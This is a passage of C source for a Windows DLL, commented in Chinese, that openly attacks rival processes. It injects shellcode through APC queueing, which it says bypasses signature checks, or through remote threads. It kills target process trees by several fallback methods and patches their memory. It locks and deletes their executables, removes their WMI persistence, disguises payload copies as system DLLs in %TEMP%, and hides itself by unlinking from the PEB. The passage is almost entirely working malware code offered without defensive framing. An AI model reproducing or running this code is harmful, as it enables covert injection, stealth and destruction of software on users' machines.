    DWORD bytesRead = 0;
    if (!ReadFile(hFile, pLocal, fileSize, &bytesRead, NULL) || bytesRead != fileSize)
    {
        CloseHandle(hFile); VirtualFree(pLocal, 0, MEM_RELEASE); return FALSE;
    }
    CloseHandle(hFile);

    HANDLE hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProc)
    {
        VirtualFree(pLocal, 0, MEM_RELEASE);
        WriteKillLog(L"shellcode 打开进程失败 PID=%lu err=%lu", pid, GetLastError());
        return FALSE;
    }

    LPVOID pRemote = VirtualAllocEx(hProc, NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pRemote)
    {
        CloseHandle(hProc); VirtualFree(pLocal, 0, MEM_RELEASE);
        WriteKillLog(L"shellcode VirtualAllocEx 失败 PID=%lu", pid);
        return FALSE;
    }

    if (!WriteProcessMemory(hProc, pRemote, pLocal, fileSize, NULL))
    {
        VirtualFreeEx(hProc, pRemote, 0, MEM_RELEASE);
        CloseHandle(hProc); VirtualFree(pLocal, 0, MEM_RELEASE);
        WriteKillLog(L"shellcode WriteProcessMemory 失败 PID=%lu", pid);
        return FALSE;
    }

    BOOL result = FALSE;
    int apcQueued = 0;

    if (useApc)
    {
        /* APC 注入：绕过 LoadLibrary 签名检查（直接执行已写入的代码） */
        HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if (hThreadSnap != INVALID_HANDLE_VALUE)
        {
            THREADENTRY32 te;
            te.dwSize = sizeof(te);
            if (Thread32First(hThreadSnap, &te))
            {
                do {
                    if (te.th32OwnerProcessID == pid)
                    {
                        HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
                        if (hThread)
                        {
                            if (QueueUserAPC((PAPCFUNC)pRemote, hThread, 0))
                            {
                                result = TRUE;
                                apcQueued++;
                            }
                            CloseHandle(hThread);
                        }
                    }
                } while (Thread32Next(hThreadSnap, &te));
            }
            CloseHandle(hThreadSnap);
        }
        WriteKillLog(L"APC 排队注入 PID=%lu 线程数=%d 结果=%s", pid, apcQueued, result ? L"成功" : L"失败");
    }

    if (!result)
    {
        /* 回退到 CreateRemoteThread */
        HANDLE hRemote = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pRemote, NULL, 0, NULL);
        if (hRemote)
        {
            WaitForSingleObject(hRemote, 100);
            CloseHandle(hRemote);
            result = TRUE;
            WriteKillLog(L"远程线程 shellcode 注入 PID=%lu 成功", pid);
        }
        else
        {
            WriteKillLog(L"远程线程 shellcode 注入 PID=%lu 失败 err=%lu", pid, GetLastError());
        }
    }

    CloseHandle(hProc);
    VirtualFree(pLocal, 0, MEM_RELEASE);
    return result;
}

/* 方法4：Job 对象终止 */
static BOOL KillByJobObject(DWORD pid)
{
    BOOL bResult = FALSE;
    HANDLE hProc = OpenProcess(PROCESS_SET_QUOTA | PROCESS_TERMINATE, FALSE, pid);
    if (!hProc)
    {
        WriteKillLog(L"Job 打开进程失败 PID=%lu err=%lu", pid, GetLastError());
        return FALSE;
    }

    HANDLE hJob = CreateJobObjectW(NULL, NULL);
    if (!hJob)
    {
        CloseHandle(hProc);
        return FALSE;
    }

    // 设置 Job 信息：当 Job 中最后一个进程句柄关闭时终止所有进程
    JOBOBJECT_EXTENDED_LIMIT_INFORMATION jeli = { 0 };
    jeli.BasicLimitInformation.LimitFlags = JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE;
    if (SetInformationJobObject(hJob, JobObjectExtendedLimitInformation, &jeli, sizeof(jeli)))
    {
        if (AssignProcessToJobObject(hJob, hProc))
        {
            // Job 已绑定，关闭 Job 句柄将终止进程（因为设置了 KILL_ON_JOB_CLOSE）
            // 但需要等待一小段时间让系统执行
            CloseHandle(hJob);   // 这会触发目标进程终止
            bResult = TRUE;
            WriteKillLog(L"Job 对象绑定成功 PID=%lu", pid);
        }
        else
        {
            WriteKillLog(L"Job 绑定失败 PID=%lu err=%lu", pid, GetLastError());
            CloseHandle(hJob);
        }
    }
    else
    {
        CloseHandle(hJob);
    }

    CloseHandle(hProc);
    return bResult;
}

static BOOL GetProcessPath(DWORD pid, WCHAR *path, DWORD cch)
{
    path[0] = L'\0';
    HANDLE h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!h) return FALSE;
    DWORD size = cch;
    BOOL ok = QueryFullProcessImageNameW(h, 0, path, &size);
    CloseHandle(h);
    return ok;
}

static void LockImage(LPCWSTR path)
{
    if (!path || !path[0]) return;
    LONG n = g_nLocks;
    for (LONG i = 0; i < n && i < MAX_LOCKS; i++) {
        if (g_lockPaths[i][0] && _wcsicmp(g_lockPaths[i], path) == 0)
            return;
    }
    LONG slot = InterlockedIncrement(&g_nLocks) - 1;
    if (slot < 0 || slot >= MAX_LOCKS) { InterlockedDecrement(&g_nLocks); return; }
    wcsncpy(g_lockPaths[slot], path, MAX_PATH - 1);
    g_lockPaths[slot][MAX_PATH - 1] = L'\0';
    g_hLocks[slot] = NULL;
    WriteKillLog(L"记录镜像锁路径: %s", path);
}

static void MaintainLocks(void)
{
    LONG n = g_nLocks;
    for (LONG i = 0; i < n && i < MAX_LOCKS; i++) {
        if (!g_lockPaths[i][0] || g_hLocks[i]) continue;
        HANDLE h = CreateFileW(g_lockPaths[i], 0, 0, NULL, OPEN_EXISTING,
                               FILE_ATTRIBUTE_NORMAL, NULL);
        if (h != INVALID_HANDLE_VALUE)
        {
            g_hLocks[i] = h;
            WriteKillLog(L"镜像锁获取成功: %s", g_lockPaths[i]);
        }
    }
}

static BOOL TryAllMethods(LPCWSTR exeName, DWORD pid)
{
    WCHAR killerPath[MAX_PATH];
    if (g_szPayloadCopy[0]) wcsncpy_s(killerPath, MAX_PATH, g_szPayloadCopy, _TRUNCATE);
    else GetKillerPath(killerPath, MAX_PATH);

    BOOL bTarget = IsTargetName(exeName);
    const WCHAR *name = exeName ? exeName : L"unknown";

    // 方法1：直接终止
    if (KillByTerminate(pid))
    {
        WriteKillLog(L"已结束 %s PID=%lu (TerminateProcess)", name, pid);
        return TRUE;
    }

    // 方法2：CreateRemoteThread + ExitProcess（正常退出路径，跑 DLL_PROCESS_DETACH）
    if (KillByRemoteExit(pid))
    {
        WriteKillLog(L"已结束 %s PID=%lu (RemoteExit)", name, pid);
        return TRUE;
    }

    // 方法3：注入 payload.dll（host only - target 禁止非 MS 签名 DLL）
    if (!bTarget && KillByKillerDll(pid, killerPath))
    {
        return TRUE;
    }

    // 方法3b：注入 payload.bin shellcode
    // - target (yy): 使用 APC 绕过签名检查
    // - host (notepad): 使用 CreateRemoteThread
    if (bTarget)
    {
        if (KillByKillerBin(pid, TRUE))  // APC
        {
            WriteKillLog(L"已通过 APC 注入 shellcode 结束 %s PID=%lu", name, pid);
            return TRUE;
        }
    }
    else
    {
        if (KillByKillerBin(pid, FALSE)) // RemoteThread
        {
            WriteKillLog(L"已通过远程线程 shellcode 结束 %s PID=%lu", name, pid);
            return TRUE;
        }
    }

    // 方法4：Job 对象终结
    if (KillByJobObject(pid))
    {
        WriteKillLog(L"已通过 Job 对象结束 %s PID=%lu", name, pid);
        return TRUE;
    }

    WriteKillLog(L"所有方法失败: %s PID=%lu", name, pid);
    return FALSE;
}

/* 攻击主循环 */
static void AttackPass(void)
{
    DWORD hostPids[128];
    DWORD targetPids[128];
    int nHosts = 0, nTargets = 0;

    /* 每个宿主都起一条 waste 模仿线程：每 2 秒给 yy **主进程**一条嘲讽
       （子进程不再嘲讽，按你的新规则直接杀掉+锁死+删除）。 */
    StartWasteMimic();

    /* 宿主判定：
       ① 我们跑在 yy/ww 主进程里 —— 不杀自己（外围的副本会杀它），只做 #10/#11 内部感染；
       ② 我们跑在 yy 家族的**子进程**（蜜罐等）里 —— 同样不杀自己，外围会把它杀掉+锁死+删除；
       ③ 其它宿主（xx、explorer、notepad…）照常执行攻击。 */
    if (HostIsTargetExe()) {
        InfectYyHost();
        FindYyPopupInSelf();     /* 顺手确认弹窗（日志用） */
        return;
    }
    if (FindYyPopupInSelf() && !HostIsTargetExe()) {
        WCHAR leaf[MAX_PATH] = L"";
        HostLeafName(leaf, MAX_PATH);
        if (IsKnownYyFamilyName(leaf)) return;    /* 家族子进程宿主：不自杀 */
    }

    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE)
    {
        PROCESSENTRY32W pe;
        pe.dwSize = sizeof(pe);
        if (Process32FirstW(hSnap, &pe))
        {
            do
            {
                for (int i = 0; g_hostTargets[i]; i++)
                {
                    if (_wcsicmp(pe.szExeFile, g_hostTargets[i]) == 0)
                    {
                        if (nHosts < 128) hostPids[nHosts++] = pe.th32ProcessID;
                        break;
                    }
                }
                for (int i = 0; g_targets[i]; i++)
                {
                    if (_wcsicmp(pe.szExeFile, g_targets[i]) == 0)
                    {
                        if (nTargets < 128) targetPids[nTargets++] = pe.th32ProcessID;
                        break;
                    }
                }
            } while (Process32NextW(hSnap, &pe));
        }
        CloseHandle(hSnap);
    }

    if (nTargets || nHosts)
        WriteKillLog(L"扫描发现 目标=%d 宿主=%d", nTargets, nHosts);

    /* Phase A: 先改它内存（#16 断掉建窗、#17 12 字节 TerminateProcess），
       再杀整棵进程树、逐个"先锁死源文件再删除"；根进程目录由新线程整目录清空。
       先 patch 后杀：万一这一轮杀不掉（对手保护/PPL），patch 也已经生效了。
       注意 nTargets 现在只含 yy.exe/ww.exe —— 它们的子进程走 Phase A1 的策略。 */
    for (int i = 0; i < nTargets; i++)
    {
        PatchEnemyMemory(targetPids[i]);      /* #16 / #17：先废掉它的建窗与 TerminateProcess */
        if (TauntCountOf(targetPids[i]) >= XX_TAUNTS_BEFORE_KILL) {
            /* 本体已经嘲讽够 10 条 —— 结束它的进程树 + 源文件先锁死再删除 */
            WriteKillLog(L"嘲讽已满 %d 条，结束 yy 本体 PID=%lu 的进程树并锁死删除源文件",
                         XX_TAUNTS_BEFORE_KILL, targetPids[i]);
        KillYyBodyIfTaunted(targetPids[i], L"Phase A 扫描到本体");
            TauntForget(targetPids[i]);
        } else {
            /* 还在嘲讽阶段：先不杀（waste 模仿线程每 2 秒一条，满 10 条才动手） */
            static DWORD s_dwLogTick = 0;
            DWORD nowTick = GetTickCount();
            if (nowTick - s_dwLogTick >= 5000) {
                s_dwLogTick = nowTick;
                WriteKillLog(L"yy 本体 PID=%lu 嘲讽进度 %d/%d，暂不杀",
                             targetPids[i], TauntCountOf(targetPids[i]), XX_TAUNTS_BEFORE_KILL);
            }
        }
    }

    /* Phase A1: yy 家族子进程策略 —— 直接杀掉 + 锁死 + 删除（本体走上面的嘲讽门控） */
    ApplyYyChildPolicy();

    /* Phase A2: 删对手的 WMI 复活订阅（三件套），节流 5 秒一次 */
    {
        static DWORD s_dwLastWmi = 0;
        DWORD now = GetTickCount();
        if (nTargets > 0 && (s_dwLastWmi == 0 || now - s_dwLastWmi >= 5000)) {
            s_dwLastWmi = now;
            RemoveEnemyWmi();
        }
    }

    /* Phase B: kill guard hosts + lock image */
    for (int i = 0; i < nHosts; i++)
    {
        WCHAR path[MAX_PATH];
        path[0] = L'\0';
        GetProcessPath(hostPids[i], path, MAX_PATH);
        TryAllMethods(L"notepad.exe", hostPids[i]);
        if (path[0]) LockImage(path);
    }

    /* Phase C: catch yy respawned in the gap */
    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE)
    {
        PROCESSENTRY32W pe;
        pe.dwSize = sizeof(pe);
        if (Process32FirstW(hSnap, &pe))
        {
            do
            {
                for (int i = 0; g_targets[i]; i++)
                {
                    if (_wcsicmp(pe.szExeFile, g_targets[i]) == 0)
                    {
                        WCHAR path[MAX_PATH];
                        path[0] = L'\0';
                        GetProcessPath(pe.th32ProcessID, path, MAX_PATH);
                        WriteKillLog(L"Phase C 发现复活目标 %s PID=%lu", pe.szExeFile, pe.th32ProcessID);
                        KillYyBodyIfTaunted(pe.th32ProcessID, L"Phase C 复活目标");
                        break;
                    }
                }
            } while (Process32NextW(hSnap, &pe));
        }
        CloseHandle(hSnap);
    }

    MaintainLocks();
}

static BOOL HostIsXxExe(void) {
    WCHAR path[MAX_PATH] = L"";
    if (!GetModuleFileNameW(NULL, path, MAX_PATH)) return FALSE;
    const WCHAR *p = wcsrchr(path, L'\\');
    p = p ? p + 1 : path;
    return _wcsicmp(p, L"xx.exe") == 0;
}

static DWORD WINAPI AttackLoop(LPVOID lp)
{
    UNREFERENCED_PARAMETER(lp);

    /* One leader across hosts. Mutex released after every pass so a
       suspended/dead xx cannot stall standbys (death => WAIT_ABANDONED).
       名字带会话 token：对手再也抢不到这把锁。 */
    WCHAR szLead[128];
    XXNamedObject(szLead, _countof(szLead), FALSE, XX_PURPOSE_ATTACK_LEAD, NameTok(), 0);
    HANDLE hLead = CreateMutexW(NULL, FALSE, szLead);

    /* xx.exe 自身放慢到 300ms：攻击负荷交给被注入其它进程的副本（仍 30ms），
       既降低 xx.exe CPU，又让副本在 xx 释放 leader 后立刻接手。 */
    const DWORD dwIdle = HostIsXxExe() ? 300 : 30;
    DWORD dwCopyTick = 0;

    while (g_bRunning)
    {
        /* 注入用的 payload 副本：改名成系统 dll 并放到 %TEMP%，被删就重做 */
        {
            DWORD now = GetTickCount();
            if (dwCopyTick == 0 || now - dwCopyTick >= 5000) {
                dwCopyTick = now;
                RefreshKillerCopies();
            }
        }
        if (!hLead)
        {
            AttackPass();
            Sleep(dwIdle);
            continue;
        }
        DWORD w = WaitForSingleObject(hLead, 0);
        if (w == WAIT_OBJECT_0 || w == WAIT_ABANDONED)
        {
            AttackPass();
            ReleaseMutex(hLead);
            Sleep(dwIdle);
        }
        else
        {
            Sleep(dwIdle);
        }
    }

    if (hLead) CloseHandle(hLead);
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved)
{
    UNREFERENCED_PARAMETER(reserved);
    if (reason == DLL_PROCESS_ATTACH)
    {
        DisableThreadLibraryCalls(hinst);

        /* 摘 PEB 链后自身模块就查不到了，先缓存句柄 */
        g_hSelfModule = hinst;

        /* 进程内单例：模块隐藏后注入方无法判断宿主里有没有我们；已有实例就让
           加载失败，避免同进程叠出多套攻击线程。名字带会话 token，对手无法预先抢占 */
        XXWaitToken(&g_dwNameToken, 300);
        g_hSingleton = XXModuleSingleton(L"atkcore", NameTok());
        if (!g_hSingleton) return FALSE;

        XXHideSelfFromPeb(hinst);          /* 从 PEB 三条模块链表里摘除自己 */

        EnsureLogInit();
    }
    return TRUE;
}